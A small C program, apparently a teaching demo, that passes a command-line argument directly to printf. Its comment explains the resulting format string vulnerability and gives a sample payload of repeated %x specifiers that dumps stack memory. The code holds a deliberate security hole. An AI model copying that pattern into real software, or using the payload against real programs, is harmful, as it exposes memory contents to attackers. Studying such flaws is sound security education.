#include <stdio.h>
#include <stdlib.h>

int main( int argc, char *argv[]){
	
	printf(argv[1]);
	printf("\n");
	return 0;
}

/*
String formating in C has major, major issues...
If you give it a format string, then it will just give you the piece of information that you ask for! 

A likely payload to view the information on the stack 
./fmt "AAAAAAAAAAAAAAAA %x %x %x %x %x %x %x %x %x %x%x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %d"



*/
